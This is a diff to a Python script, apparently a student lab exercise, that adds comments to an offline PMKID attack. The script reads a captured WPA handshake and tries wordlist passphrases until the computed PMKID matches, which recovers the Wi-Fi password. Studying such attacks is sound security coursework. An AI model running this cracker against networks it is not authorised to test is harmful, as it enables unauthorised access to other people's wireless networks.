@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+__author__      = "Gabriel Roch & Cassandre Wojciechowski"
+
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
 from pbkdf2 import *
@@ -27,10 +29,12 @@ for packet in wpa :
         break
 """
 
+# The PMKID is contained in packet 146 (Key Exchange Packet 1 of 4)
 packet = wpa[145]
-
+# Storing the client and the AP's MAC addresses
 Clientmac = a2b_hex((packet.addr1).replace(":", ""))
 APmac = a2b_hex((packet.addr2).replace(":", ""))
+# Storing the PMKID sent by the AP
 pmkid = raw(packet)[-20:-4]
 
 # Create a list of passphrases from a text file
@@ -41,10 +45,12 @@ with open('passphrases.txt') as file :
         # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
         pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)
 
+        # Performing the PMKID attack by calculating a new PMKID from a passphrase
         calc_pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
         calc_pmkid = calc_pmkid.digest()[:16]
         print("Passphrase tested : ", passPhrase)
 
+        # Comparing the PMKID calculated with the one found in the pcap file
         if calc_pmkid == pmkid :
-            print("Passphrase found : ", passPhrase)
+            print("PASSPHRASE FOUND : ", passPhrase)
             exit(0)
